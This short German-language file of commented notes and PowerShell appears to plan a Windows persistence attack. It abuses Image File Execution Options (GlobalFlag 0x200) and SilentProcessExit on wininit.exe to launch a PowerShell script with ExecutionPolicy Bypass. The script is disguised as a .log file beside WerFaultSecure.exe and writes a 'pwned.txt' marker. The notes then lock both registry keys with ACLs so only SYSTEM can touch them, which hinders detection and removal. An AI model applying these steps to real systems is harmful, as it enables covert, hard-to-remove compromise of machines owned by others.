# Prozess

# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe
# GlobalFlag = 0x200 unter IFEO\wininit.exe

# Ein .ps1-Script auf dem System erstellen -> C:\Windows\SysWOW64\WerFaultSecure.log (WerFaultSecure.exe liegt hier)

# Das Script erstellt pwned.txt
# Set-Content -Path "C:\Users\Public\Documents\pwned.txt" -Value "Pwn3d" -Encoding UTF8

# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\
# MonitorProcess + ReportingMode unter SilentProcessExit\wininit.exe
# MonitorProcess = "powershell.exe -ExecutionPolicy Bypass -File C:\pfad\script.ps1"


# ACL auf beide Registry-Schlüssel setzen


# $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe"
# $acl = Get-Acl $path
# # Alle bestehenden Regeln entfernen
# $acl.SetAccessRuleProtection($true, $false)
# # Nur SYSTEM darf lesen und schreiben
# $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
#     "SYSTEM",
#     "FullControl",
#     "Allow"
# )
# $acl.AddAccessRule($rule)
# Set-Acl -Path $path -AclObject $acl


# $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\wininit.exe"
# $acl = Get-Acl $path
# # Alle bestehenden Regeln entfernen
# $acl.SetAccessRuleProtection($true, $false)
# # Nur SYSTEM darf lesen und schreiben
# $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
#     "SYSTEM",
#     "FullControl",
#     "Allow"
# )
# $acl.AddAccessRule($rule)
# Set-Acl -Path $path -AclObject $acl